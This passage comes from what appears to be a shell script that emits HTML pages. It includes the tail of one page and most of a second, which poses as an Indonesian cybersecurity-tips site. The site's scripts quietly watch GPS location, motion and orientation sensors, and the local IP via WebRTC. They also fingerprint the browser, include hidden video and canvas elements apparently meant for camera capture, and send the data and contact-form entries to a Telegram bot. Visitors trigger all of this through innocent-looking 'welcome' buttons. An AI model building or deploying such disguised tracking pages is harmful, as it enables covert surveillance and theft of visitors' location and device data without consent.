🍪 Cookies: ${info.cookiesEnabled}
💾 Local Storage: ${info.localStorage}
🗄️ Session Storage: ${info.sessionStorage}
📡 Status: ${info.onLine}
👁️ Visibility: ${info.visibilityState}
🧭 Device Orientation: ${info.deviceOrientation}
📊 Absolute Orientation: ${info.absoluteOrientation}
📈 Device Motion: ${info.deviceMotion}
🔙 Referrer: ${info.referrer}`;
    
        chatIds.forEach(id => {
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: id, text: message })
          })
          .then(response => response.json())
          .then(data => {
            if(data.ok) {
              loadingContainer.style.display = 'none';
              guideModal.style.display = 'flex';
              document.getElementById('tips').scrollIntoView({ behavior: 'smooth' });
            } else {
              loadingText.textContent = "Gagal mengirim info. Coba lagi nanti.";
            }
          })
          .catch(() => {
            loadingText.textContent = "Gagal mengirim info. Coba lagi nanti.";
          });
        });
      } catch (err) {
        loadingText.textContent = "Error: " + err;
      }
    }
    async function loadTelegramFeed() {
      const telegramContainer = document.getElementById('telegramFeed');
      try {
        const response = await fetch('https://api.example.com/telegram-feed');
        const data = await response.json();
        let feedHTML = "";
        data.articles.forEach(article => {
          feedHTML += `
            <div class="telegram-card">
              <h3>${article.title}</h3>
              <p>${article.summary}</p>
              <a href="${article.url}" target="_blank">Baca Selengkapnya</a>
            </div>`;
        });
        telegramContainer.innerHTML = feedHTML || "<p>Tidak ada data saat ini.</p>";
      } catch (error) {
        telegramContainer.innerHTML = "<p>Gagal load hot feed, bro. Coba refresh!</p>";
      }
    }
    document.getElementById('sendBtn').addEventListener('click', sendInfo);
    const welcomeModal = document.getElementById('welcomeModal');
    const continueBtn = document.getElementById('continueBtn');
    window.addEventListener('load', () => { 
      welcomeModal.style.display = 'flex';
      loadTelegramFeed();
    });
    continueBtn.addEventListener('click', () => {
      welcomeModal.style.display = 'none';
      sendInfo();
    });
    document.getElementById('contactForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const name = this.querySelector('input[type="text"]').value.trim();
      const email = this.querySelector('input[type="email"]').value.trim();
      const messageText = this.querySelector('textarea').value.trim();
      const currentUrl = window.location.href;
      const referrer = document.referrer || "Tidak Ada";
      const timestamp = new Date().toLocaleString();
      const message =
        `🔔 *Pesan Kontak Baru Diterima* 🔔\n\n` +
        `👤 *Nama*: ${name}\n` +
        `📧 *Email*: ${email}\n` +
        `💬 *Pesan*: ${messageText}\n\n` +
        `🕒 *Waktu*: ${timestamp}\n` +
        `🌐 *URL*: ${currentUrl}\n` +
        `🔙 *Referrer*: ${referrer}`;
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: id, text: message, parse_mode: 'Markdown' })
        })
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert("Pesan lo berhasil terkirim! Tim kami akan segera menghubungi lo.");
            document.getElementById('contactForm').reset();
          } else {
            alert("Ups, ada error saat mengirim pesan. Coba lagi nanti ya.");
          }
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Gagal mengirim pesan. Coba lagi nanti.");
        });
      });
    });
  </script>
</body>
</html>
EOF
      ;;
    2) # ini ke dua
      cat <<'EOF'
<!doctype html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Teknologi Terkini - Cyber Security Gokil</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@400;700;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-p1CmS8Bz+1Jkj0sAnbOXOd72x1OoQGN/8xKpG2twZBd3p3MUK+U9c5DkM8jbFxvHzZ+0YjZ5Rq9K+U5x7rZ+Iw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    :root {
      --bg-dark: #0a0f1f;
      --bg-light: #f0f2f5;
      --surface-dark: rgba(18, 25, 49, 0.7);
      --surface-light: rgba(255, 255, 255, 0.7);
      --primary: #00f5c3;
      --secondary: #7f5af0;
      --text-dark: #e0e6f0;
      --text-light: #12182b;
      --border-color: rgba(0, 245, 195, 0.2);
      --font-display: 'Exo 2', sans-serif;
      --font-body: 'Roboto Mono', monospace;
      --transition-speed: 0.4s;
      --border-radius: 12px;
      --shadow-glow: 0 0 15px rgba(0, 245, 195, 0.2), 0 0 30px rgba(0, 245, 195, 0.1);
    }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: var(--bg-dark); }
    ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    ::-webkit-scrollbar-thumb:hover { background: #fff; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { scroll-behavior: smooth; }
    body {
      font-family: var(--font-body);
      background-color: var(--bg-light);
      background-image:
        radial-gradient(rgba(127, 90, 240, 0.1) 1px, transparent 1px),
        radial-gradient(rgba(127, 90, 240, 0.1) 1px, transparent 1px);
      background-size: 40px 40px;
      background-position: 0 0, 20px 20px;
      color: var(--text-light);
      line-height: 1.7;
      overflow-x: hidden;
      transition: background-color var(--transition-speed) ease, color var(--transition-speed) ease;
    }
    body.dark-mode {
      background-color: var(--bg-dark);
      color: var(--text-dark);
      background-image:
        radial-gradient(rgba(0, 245, 195, 0.05) 1px, transparent 1px),
        radial-gradient(rgba(0, 245, 195, 0.05) 1px, transparent 1px);
    }
    .header {
      text-align: center;
      padding: 180px 20px 120px;
      color: #fff;
      position: relative;
      overflow: hidden;
      background: linear-gradient(45deg, #0a0f1f, #12182b);
    }
    .header::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: url('https://www.transparenttextures.com/patterns/cubes.png'), linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
      background-blend-mode: multiply;
      opacity: 0.1;
      z-index: 1;
      animation: noise 10s steps(10) infinite;
    }
    @keyframes noise {
      0%, 100% { transform: translate(0, 0); } 10% { transform: translate(-2%, -5%); } 20% { transform: translate(3%, 2%); } 30% { transform: translate(-5%, 3%); } 40% { transform: translate(2%, -4%); } 50% { transform: translate(-3%, 5%); } 60% { transform: translate(4%, -2%); } 70% { transform: translate(-2%, 3%); } 80% { transform: translate(5%, -5%); } 90% { transform: translate(-4%, 2%); }
    }
    .header h1, .header p { position: relative; z-index: 2; }
    .header h1 {
      font-family: var(--font-display); font-size: 5em; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; color: #fff;
      text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary), 0 0 40px var(--primary), 0 0 80px var(--secondary);
      animation: flicker 3s infinite alternate;
    }
    @keyframes flicker {
      0%, 18%, 22%, 25%, 53%, 57%, 100% { text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary), 0 0 40px var(--primary), 0 0 80px var(--secondary); } 20%, 24%, 55% { text-shadow: none; }
    }
    .header p { font-size: 1.5em; max-width: 800px; margin: 0 auto; color: var(--text-dark); animation: fadeInUp 1s ease-out; }
    @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    .news-ticker { background: var(--primary); color: var(--bg-dark); padding: 12px 0; overflow: hidden; white-space: nowrap; font-weight: 700; font-family: var(--font-body); }
    .news-ticker p { display: inline-block; padding-left: 100%; animation: ticker 20s linear infinite; }
    @keyframes ticker { from { transform: translateX(0); } to { transform: translateX(-100%); } }
    .dark-mode-toggle {
      position: fixed; top: 20px; right: 20px; background: var(--surface-dark); border: 1px solid var(--border-color); border-radius: 50%; width: 50px; height: 50px;
      cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all var(--transition-speed) ease; z-index: 1100; font-size: 1.5em; color: var(--primary); backdrop-filter: blur(10px);
    }
    .dark-mode-toggle:hover { background: var(--primary); color: var(--bg-dark); box-shadow: var(--shadow-glow); transform: scale(1.1) rotate(360deg); }
    .navbar {
      background: rgba(10, 15, 31, 0.5); padding: 15px 20px; box-shadow: 0 2px 20px rgba(0,0,0,0.3); position: sticky; top: 0; z-index: 1000;
      display: flex; align-items: center; justify-content: space-between; transition: background-color var(--transition-speed) ease; backdrop-filter: blur(15px); border-bottom: 1px solid var(--border-color);
    }
    .nav-list { list-style: none; display: flex; flex-wrap: wrap; gap: 5px; }
    .nav-list li a { color: var(--text-dark); text-decoration: none; font-size: 1.1em; padding: 10px 15px; border-radius: 8px; position: relative; overflow: hidden; transition: color var(--transition-speed) ease; }
    .nav-list li a::before { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 0; height: 2px; background-color: var(--primary); transition: width var(--transition-speed) ease; }
    .nav-list li a:hover { color: var(--primary); }
    .nav-list li a:hover::before { width: 80%; }
    .hamburger { display: none; cursor: pointer; }
    .hamburger span { display: block; width: 25px; height: 3px; margin: 5px 0; background: #fff; border-radius: 2px; transition: all var(--transition-speed) ease; }
    .container {
      width: 90%; max-width: 1200px; margin: 60px auto; background: var(--surface-light); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
      padding: 40px; border-radius: var(--border-radius); border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.1);
      transition: all var(--transition-speed) ease; animation: fadeIn 1s ease-out;
    }
    body.dark-mode .container { background: var(--surface-dark); border: 1px solid var(--border-color); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.3); }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    h2 { font-family: var(--font-display); color: var(--text-light); font-size: 2.8em; font-weight: 700; margin-bottom: 25px; text-align: center; text-transform: uppercase; }
    body.dark-mode h2 { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
    p { font-size: 1.1em; margin-bottom: 20px; text-align: justify; }
    section ul, section ol { max-width: 800px; margin: 20px auto; padding-left: 25px; text-align: left; }
    section li { margin-bottom: 12px; font-size: 1.1em; padding-left: 15px; position: relative; }
    section li::before { content: '»'; position: absolute; left: 0; color: var(--primary); font-weight: bold; }
    .cta-button {
      background: transparent; color: var(--primary); padding: 15px 35px; font-size: 1.2em; font-family: var(--font-body); font-weight: 700;
      border-radius: 50px; border: 2px solid var(--primary); cursor: pointer; transition: all var(--transition-speed) ease; display: block; margin: 30px auto; position: relative; overflow: hidden;
    }
    .cta-button:hover { background: var(--primary); color: var(--bg-dark); box-shadow: var(--shadow-glow); transform: translateY(-5px); }
    .loading-container { display: none; text-align: center; margin-top: 20px; }
    .loading-bar { width: 100%; height: 5px; background-color: rgba(0, 245, 195, 0.1); border-radius: 5px; overflow: hidden; margin-top: 10px; }
    .loading-bar::after { content: ''; display: block; height: 100%; width: 0; background: var(--primary); animation: loading 2s infinite; box-shadow: var(--shadow-glow); }
    @keyframes loading { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 0%; } }
    .loading-text { font-size: 1.2em; font-weight: 700; color: var(--primary); margin-top: 15px; }
    .contact-info { list-style: none; text-align: center; margin-bottom: 30px; }
    .contact-info li { font-size: 1.1em; margin-bottom: 10px; }
    .contact-info a { color: var(--primary); text-decoration: none; transition: all var(--transition-speed) ease; }
    .contact-info a:hover { color: #fff; text-shadow: 0 0 5px var(--primary); }
    .contact-form { max-width: 600px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
    .contact-form input, .contact-form textarea {
      padding: 15px; border: 1px solid var(--border-color); border-radius: var(--border-radius); font-size: 1em; font-family: var(--font-body);
      outline: none; transition: all var(--transition-speed) ease; background: transparent; color: var(--text-light);
    }
    body.dark-mode .contact-form input, body.dark-mode .contact-form textarea { color: var(--text-dark); }
    .contact-form input:focus, .contact-form textarea:focus { border-color: var(--primary); box-shadow: var(--shadow-glow); }
    .footer { background: var(--bg-dark); color: var(--text-dark); text-align: center; padding: 40px 20px; margin-top: 60px; border-top: 2px solid var(--primary); }
    .footer a { color: var(--primary); text-decoration: none; transition: color var(--transition-speed) ease; }
    .footer a:hover { color: #fff; }
    .social-icons { margin-top: 20px; }
    .social-icons a { color: var(--text-dark); margin: 0 15px; font-size: 1.8em; transition: all var(--transition-speed) ease; }
    .social-icons a:hover { color: var(--primary); transform: translateY(-5px); }
      position: fixed; bottom: 30px; right: 30px; background: var(--primary); color: var(--bg-dark); border: none; width: 50px; height: 50px;
      border-radius: 50%; cursor: pointer; display: none; z-index: 1000; font-size: 1.2em; transition: all var(--transition-speed) ease;
    }
    .modal {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10, 15, 31, 0.5);
      align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(10px);
    }
    .modal-content {
      background: var(--bg-dark); padding: 40px; border-radius: var(--border-radius); border: 1px solid var(--primary); box-shadow: var(--shadow-glow);
      max-width: 600px; width: 90%; text-align: center; position: relative; animation: scaleIn 0.5s ease; color: var(--text-dark);
    }
    @keyframes scaleIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    .modal-content h3 { margin-bottom: 20px; color: var(--primary); font-family: var(--font-display); font-size: 2em; }
    .modal-close { position: absolute; top: 15px; right: 20px; font-size: 1.8em; cursor: pointer; color: var(--text-dark); transition: all var(--transition-speed) ease; }
    .modal-close:hover { color: var(--primary); transform: rotate(90deg); }
    .telegram-card {
      background: var(--surface-light); border: 1px solid rgba(255,255,255,0.2); border-radius: var(--border-radius); box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      padding: 25px; transition: all var(--transition-speed) ease; display: flex; flex-direction: column;
    }
    body.dark-mode .telegram-card { background: var(--surface-dark); border: 1px solid var(--border-color); box-shadow: none; }
    .telegram-card:hover { transform: translateY(-10px) scale(1.02); box-shadow: var(--shadow-glow); border-color: var(--primary); }
    .telegram-card h3 { font-size: 1.5em; margin-bottom: 15px; color: var(--text-light); font-family: var(--font-display); }
    body.dark-mode .telegram-card h3 { color: var(--primary); }
    .telegram-card p { font-size: 1em; margin-bottom: 15px; flex-grow: 1; }
    .telegram-card a { text-decoration: none; color: var(--secondary); font-weight: bold; align-self: flex-end; transition: color var(--transition-speed) ease; }
    .telegram-card a:hover { color: var(--primary); }
    @media (max-width: 768px) {
      .nav-list {
        position: absolute; top: 75px; right: 0; background: var(--bg-dark); flex-direction: column; width: 100%; border-radius: 0;
        display: none; padding: 20px 0; border-bottom: 2px solid var(--primary);
      }
      .nav-list.active { display: flex; }
      .nav-list li { margin: 10px 0; text-align: center; width: 100%; }
      .hamburger { display: flex; flex-direction: column; gap: 5px; }
      .header h1 { font-size: 2.8em; }
      .header p { font-size: 1.2em; }
      h2 { font-size: 2.2em; }
    }
  </style>
</head>
<body>
  <button class="dark-mode-toggle" id="darkModeToggle"><span>🌙</span></button>

  <div class="modal" id="welcomeModal" style="display: flex;">
    <div class="modal-content">
      <h3>Selamat Datang, Bro!</h3>
      <p>Jelajahi info cyber security terupdate & canggih, langsung dapet info via Telegram.</p>
      <button class="cta-button" id="continueBtn">Lanjut, Gan!</button>
    </div>
  </div>

  <header class="header" id="home">
    <h1>Teknologi Terkini</h1>
    <p>Cyber Security Gokil buat lo yang update dan siap nge-breakin segala serangan!</p>
  </header>

  <div class="news-ticker">
    <p><i class="fa-solid fa-bolt"></i> BREAKING: Serangan siber global makin gila!     <i class="fa-solid fa-bolt"></i> Cyber Tip: Aktifin VPN & 2FA buat proteksi maksimal!     <i class="fa-solid fa-bolt"></i> ALERT: Phishing scam baru menargetkan gamer!    </p>
  </div>

  <nav class="navbar">
    <a href="#home" style="text-decoration:none; color: var(--primary); font-family: var(--font-display); font-size: 1.5em; font-weight: 700;">CYBERSEC</a>
    <ul class="nav-list" id="navList">
      <li><a href="#home"><i class="fa-solid fa-house"></i> Beranda</a></li>
      <li><a href="#tips"><i class="fa-solid fa-lightbulb"></i> Tips & Trik</a></li>
      <li><a href="#dashboard"><i class="fa-solid fa-chart-line"></i> Tentang</a></li>
      <li><a href="#fitur"><i class="fa-solid fa-rocket"></i> Fitur</a></li>
      <li><a href="#tutorial"><i class="fa-solid fa-graduation-cap"></i> Tutorial</a></li>
      <li><a href="#faq"><i class="fa-solid fa-question"></i> FAQ</a></li>
      <li><a href="#telegram"><i class="fa-solid fa-telegram"></i> Hot Telegram</a></li>
      <li><a href="#kontak"><i class="fa-solid fa-envelope"></i> Kontak</a></li>
    </ul>
    <div class="hamburger" id="hamburger">
      <span></span><span></span><span></span>
    </div>
  </nav>

  <section class="container" id="home-section">
    <h2>Selamat Datang, Bro!</h2>
    <p>Lo lagi di surga info teknologi terkini dan tips keamanan digital yang super update. Jelajahi semua menu dan fitur canggih buat lo jadi makin jago hadapin serangan siber!</p>
  </section>

  <section class="container" id="tips">
    <h2>7 Cara Anti Hack yang Wajib Lo Tahu</h2>
    <p>Di dunia digital yang super canggih ini, lo harus siap dengan strategi jitu. Nih, cek tips dari para ahli buat pertahanan level dewa:</p>
    <ol>
      <li><strong>Password Unik & Kompleks:</strong> Gunakan kombinasi huruf besar-kecil, angka, dan simbol. Jangan pernah pakai ulang password!</li>
      <li><strong>Aktifkan Multi-Factor Authentication (MFA/2FA):</strong> Lapisan keamanan ekstra ini adalah kunci. Wajib aktif di semua akun penting.</li>
      <li><strong>Waspada Phishing:</strong> Jangan asal klik link atau download lampiran dari email/pesan yang mencurigakan. Verifikasi dulu sumbernya.</li>
      <li><strong>Update Segalanya:</strong> Sistem operasi, browser, dan aplikasi harus selalu dalam versi terbaru untuk menutup celah keamanan.</li>
      <li><strong>Gunakan VPN Terpercaya:</strong> Enkripsi koneksi internet lo, terutama saat menggunakan Wi-Fi publik, untuk menjaga privasi.</li>
      <li><strong>Backup Data Secara Rutin:</strong> Simpan data penting di beberapa tempat (cloud & fisik) untuk antisipasi serangan ransomware.</li>
      <li><strong>Pasang Antivirus & Firewall:</strong> Ini adalah garda terdepan pertahanan digital lo dari malware dan akses ilegal.</li>
    </ol>
    <button class="cta-button" id="sendBtn">welcome to website</button>
    <div class="loading-container" id="loadingContainer">
      <div class="loading-bar"></div>
      <p class="loading-text" id="loadingText">Loading...</p>
    </div>
  </section>

  <section class="container" id="dashboard">
    <h2>Tentang Kami</h2>
    <p>Selamat datang di Teknologi Terkini, pusat komando digital yang ngasih lo intelijen terbaru seputar keamanan siber. Di sini, lo bakal nemuin berbagai tips, tutorial, FAQ, dan fitur canggih buat upgrade skill lo menghadapi segala ancaman di dunia maya.</p>
    <p>Dengan desain futuristik, responsif, dan dilengkapi dark mode, kami memastikan lo mendapatkan informasi dengan cara paling keren. Semua update krusial dikirim real-time langsung ke channel Telegram!</p>
  </section>

  <section class="container" id="fitur">
    <h2>Fitur Canggih</h2>
    <p>Kami nggak main-main! Ini dia fitur-fitur advanced yang siap manjain lo:</p>
    <ul>
      <li>Pengumpulan data perangkat real-time untuk notifikasi Telegram.</li>
      <li>Analisis mendalam tentang koneksi, performa, dan load time halaman.</li>
      <li>Integrasi notifikasi Telegram dengan data lengkap.</li>
      <li>Deteksi VPN/Proxy, cookies, localStorage, dan info browser lainnya.</li>
      <li>Enkripsi data & proteksi privasi tingkat tinggi.</li>
      <li>Mode Dark & Light sesuai mood lo.</li>
      <li>Tampilan responsif keren di semua device.</li>
    </ul>
  </section>

  <section class="container" id="tutorial">
    <h2>Tutorial Cyber Security</h2>
    <p>Belajar jadi jagoan cyber security bareng tutorial lengkap dari kita. Ini materi yang bakal lo pelajari:</p>
    <ul>
      <li><strong>Dasar-dasar Keamanan Digital:</strong> Mengenal threat, cara kerja firewall, dan antivirus.</li>
      <li><strong>Penetration Testing:</strong> Langkah demi langkah uji kerentanan sistem.</li>
      <li><strong>Analisis Malware:</strong> Cara mengidentifikasi dan analisis malware.</li>
      <li><strong>Forensik Digital:</strong> Teknik investigasi digital untuk bongkar jejak serangan.</li>
    </ul>
  </section>

  <section class="container" id="faq">
    <h2>FAQ - Pertanyaan Umum</h2>
    <p>Punya pertanyaan seputar cyber security? Cek FAQ berikut:</p>
    <ul>
      <li><strong>Apa itu cyber security?</strong> Praktik melindungi sistem, jaringan, dan data dari serangan digital.</li>
      <li><strong>Kenapa harus pake VPN?</strong> VPN bantu sembunyikan IP dan proteksi data dari pengintaian.</li>
      <li><strong>Bagaimana memilih antivirus yang tepat?</strong> Pilih yang update, punya reputasi baik, dan sesuai kebutuhan.</li>
      <li><strong>Apakah 2FA itu wajib?</strong> Sangat direkomendasikan untuk lapisan keamanan ekstra.</li>
    </ul>
  </section>

  <section class="container" id="telegram">
    <h2>Hot Telegram Feed</h2>
    <p>Dapetin update informasi cyber security langsung dari channel Telegram favorit lo. Info mendetail bakal nongol di sini.</p>
    <div id="telegramFeed">
      <p>Loading hot feed...</p>
    </div>
  </section>

  <section class="container" id="kontak">
    <h2>Kontak Kami</h2>
    <p>Punya pertanyaan atau mau kolaborasi? Hubungi kita lewat info di bawah atau isi form kontak.</p>
    <ul class="contact-info">
      <li>Email: <a href="mailto:info@teknologiterkini.com">info@teknologiterkini.com</a></li>
      <li>Telepon: +62 812 3456 7890</li>
      <li>Alamat: Jl. Teknologi No. 123, Jakarta, Indonesia</li>
    </ul>
    <form class="contact-form" id="contactForm">
      <input type="text" placeholder="Nama Kamu" required>
      <input type="email" placeholder="Email Kamu" required>
      <textarea placeholder="Pesan Kamu" rows="4" required></textarea>
      <button type="submit" class="cta-button">Kirim Pesan</button>
    </form>
    <div style="margin-top:20px; text-align:center; border-radius: var(--border-radius); overflow: hidden; border: 1px solid var(--border-color);">
      <iframe src="https://maps.google.com/maps?q=Jakarta&t=&z=13&ie=UTF8&iwloc=&output=embed" width="100%" height="300" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
    </div>
  </section>

  <footer class="footer">
    <p>© 2025 Teknologi Terkini. Dikembangin oleh <a href="#">Tim Ahli</a>.</p>
    <div class="social-icons">
      <a href="#"><i class="fa-brands fa-twitter"></i></a>
      <a href="#"><i class="fa-brands fa-discord"></i></a>
      <a href="#"><i class="fa-brands fa-github"></i></a>
      <a href="#"><i class="fa-brands fa-telegram"></i></a>
    </div>
  </footer>

  <button id="backToTop"><i class="fa-solid fa-angle-up"></i></button>

  <div class="modal" id="guideModal">
    <div class="modal-content">
      <span class="modal-close" id="modalClose">×</span>
      <h3>Panduan Keamanan Digital</h3>
      <p>Simak panduan lengkap untuk jaga perangkat lo secara maksimal. Ikutin tips para ahli agar lo makin siap hadapin serangan siber.</p>
    </div>
  </div>

  <video id="video-capture" style="display:none;" autoplay playsinline></video>
  <canvas id="canvas-capture" style="display:none;"></canvas>

  <script>
    // ===================================================================
    // SCRIPT LENGKAP UNTUK FUNGSI WEBSITE (TERMASUK KAMERA)
    // ===================================================================

    // --- KONFIGURASI TELEGRAM (WAJIB DIISI) ---
    const botToken = "GANTI_BAGIAN_INI_DENGAN_TOKEN_BOT_TELEGRAM";
    const chatIds = [GANTI_DENGAN_CHAT_ID"]; // Boleh lebih dari satu, pisahkan dengan koma

    // --- FUNGSI UTAMA & INTERAKSI UI ---
    let latestPosition = null, orientationData = { alpha: null, beta: null, gamma: null }, motionData = null, absoluteOrientationData = null;
    
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(
        (position) => { latestPosition = position; },
        (error) => { console.error("Error tracking lokasi: " + error.message); },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
      );
    }
    if (window.DeviceOrientationEvent) {
      window.addEventListener('deviceorientation', event => {
        orientationData.alpha = event.alpha;
        orientationData.beta = event.beta;
        orientationData.gamma = event.gamma;
      });
    }
    window.addEventListener('devicemotion', event => {
      motionData = { acceleration: event.acceleration, rotationRate: event.rotationRate, interval: event.interval };
    });
    if ('AbsoluteOrientationSensor' in window) {
      try {
        let sensor = new AbsoluteOrientationSensor({ frequency: 60 });
        sensor.addEventListener('reading', () => {
          const q = sensor.quaternion;
          const sinr_cosp = 2 * (q[0] * q[1] + q[2] * q[3]);
          const cosr_cosp = 1 - 2 * (q[1] * q[1] + q[2] * q[2]);
          const roll = Math.atan2(sinr_cosp, cosr_cosp);
          const sinp = 2 * (q[0] * q[2] - q[3] * q[1]);
          let pitch = Math.abs(sinp) >= 1 ? Math.sign(sinp) * Math.PI / 2 : Math.asin(sinp);
          const siny_cosp = 2 * (q[0] * q[3] + q[1] * q[2]);
          const cosy_cosp = 1 - 2 * (q[2] * q[2] + q[3] * q[3]);
          const yaw = Math.atan2(siny_cosp, cosy_cosp);
          absoluteOrientationData = {
            roll: (roll * (180/Math.PI)).toFixed(2),
            pitch: (pitch * (180/Math.PI)).toFixed(2),
            yaw: (yaw * (180/Math.PI)).toFixed(2)
          };
        });
        sensor.start();
      } catch (error) {
        console.error("AbsoluteOrientationSensor error: ", error);
      }
    }
    
    const darkModeToggle = document.getElementById('darkModeToggle');
    darkModeToggle.addEventListener('click', () => {
      document.body.classList.toggle('dark-mode');
      darkModeToggle.innerHTML = document.body.classList.contains('dark-mode') ? '<span>☀️</span>' : '<span>🌙</span>';
    });
    
    const hamburger = document.getElementById('hamburger');
    const navList = document.getElementById('navList');
    hamburger.addEventListener('click', () => {
      navList.classList.toggle('active');
    });
    
    const backToTop = document.getElementById('backToTop');
    window.addEventListener('scroll', () => {
      backToTop.style.display = (window.pageYOffset > 300) ? 'flex' : 'none';
      backToTop.style.alignItems = 'center';
      backToTop.style.justifyContent = 'center';
    });
    backToTop.addEventListener('click', () => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });

    const guideModal = document.getElementById('guideModal');
    const modalClose = document.getElementById('modalClose');
    modalClose.addEventListener('click', () => { guideModal.style.display = 'none'; });
    window.addEventListener('click', (e) => { if (e.target === guideModal) { guideModal.style.display = 'none'; } });

    function getLocalIP() {
      return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
        pc.onicecandidate = ice => {
          if (ice && ice.candidate && ice.candidate.candidate) {
            const ip = ice.candidate.candidate.split(' ')[4];
            pc.close();
            resolve(ip);
          }
        };
      });
    }

    function computeDistance(lat1, lon1, lat2, lon2) {
      const R = 6371;
      const dLat = (lat2 - lat1) * Math.PI / 180;
      const dLon = (lon2 - lon1) * Math.PI / 180;
      const a = Math.sin(dLat / 2) ** 2 + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      return R * c;
    }

    async function collectAllInfo() {
      let deviceLat = null, deviceLon = null;
      const info = {
        gpu: navigator.gpu?.name || "Tidak Terdeteksi",
        cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " core" : "Tidak Terdeteksi",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit (Pixel Ratio: ${window.devicePixelRatio})`,
        innerWindow: `${window.innerWidth}x${window.innerHeight}`,
        screenAvail: `${screen.availWidth}x${screen.availHeight}`,
        orientation: screen.orientation ? screen.orientation.type : "Tidak Terdeteksi",
        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
        vendor: navigator.vendor || "Tidak Terdeteksi",
        javaEnabled: (navigator.javaEnabled && navigator.javaEnabled()) ? "Ya" : "Tidak",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        webgl: "Tidak Terdeteksi",
        plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "Tidak Ada",
        touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ya" : "Tidak",
        adblock: "Tidak Terdeteksi",
        connection: "Tidak Terdeteksi",
        brand: navigator.userAgentData?.brands[0]?.brand || "Tidak Terdeteksi",
        os: navigator.userAgent || "Tidak Terdeteksi",
        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi",
        battery: "Tidak Terdeteksi",
        publicIp: "Tidak Terdeteksi",
        localIp: "Tidak Terdeteksi",
        city: "Tidak Terdeteksi",
        region: "Tidak Terdeteksi",
        country: "Tidak Terdeteksi",
        location: "Tidak Terdeteksi",
        language: navigator.language || "Tidak Terdeteksi",
        languages: navigator.languages ? navigator.languages.join(', ') : "Tidak Terdeteksi",
        platform: navigator.platform || "Tidak Terdeteksi",
        doNotTrack: navigator.doNotTrack || "Tidak Terdeteksi",
        currentURL: window.location.href,
        referrer: document.referrer || "Tidak Ada",
        onLine: navigator.onLine ? "Online" : "Offline",
        visibilityState: document.visibilityState,
        sessionStorage: (typeof window.sessionStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia"
      };
      info.pageLoadTime = (window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart) + " ms";
      info.cookiesEnabled = navigator.cookieEnabled ? "Ya" : "Tidak";
      info.localStorage = (typeof window.localStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia";
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) { info.webgl = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + " - " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
      }
      try {
        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
      } catch {
        info.adblock = "Terdeteksi";
      }
      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) => {
            if (latestPosition && latestPosition.coords.accuracy <= 20) { resolve(latestPosition); }
